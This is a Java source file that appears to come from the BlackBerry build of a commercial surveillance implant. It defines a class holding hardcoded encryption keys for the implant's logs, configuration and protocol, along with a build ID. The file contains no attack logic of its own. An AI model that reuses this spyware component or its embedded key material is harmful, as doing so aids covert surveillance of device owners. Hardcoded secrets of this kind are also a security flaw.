//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/

package fake;

import blackberry.config.KeysGetter;
import blackberry.utils.Utils;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake extends KeysGetter {

    public byte[] byteLogKey;
    public byte[] byteConfKey;
    public byte[] byteProtoKey;
    public byte[] byteRandomSeed;
    public String buildID = "RCS_0000000000";

    public InstanceKeysFake() {
        //#ifdef FAKECONF
        // Using factory: RCS_0000001079 BBB
        // -> LOGKEY   : cc77b24fc6a796c6eccd35004688d6ab6f8c0ea6d5f311910f297052f912eed9
        // -> CONFKEY  : 05d166198b37a0183c70c9682e587284211604a37d3f866f0c1e409c763dd335
        // -> SIGNATURE: 572ebc94391281ccf53a851330bb0d9984d43b7908a04255641078c167b329df
        byteLogKey = Utils
                .hexStringToByteArray(
                        "cc77b24fc6a796c6eccd35004688d6ab6f8c0ea6d5f311910f297052f912eed9",
                        0, 32);
        byteConfKey = Utils
                .hexStringToByteArray(
                        "05d166198b37a0183c70c9682e587284211604a37d3f866f0c1e409c763dd335",
                        0, 32);
        byteProtoKey = Utils
                .hexStringToByteArray(
                        "572ebc94391281ccf53a851330bb0d998bb369eaec3e2c151cde1397755f049b",
                        0, 32);
        byteRandomSeed = Utils
                .hexStringToByteArray(
                        "572ebc94391281ccf53a851330bb0d998bb369eaec3e2c151cde1397755f049b",
                        0, 32);
        buildID = "RCS_0000001079";
        //#endif
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return byteConfKey;
    }
    
    public byte[] getRandomSeed() {
        return byteRandomSeed;
    }
    
    public boolean isSeven() {
        return false;
    }

}
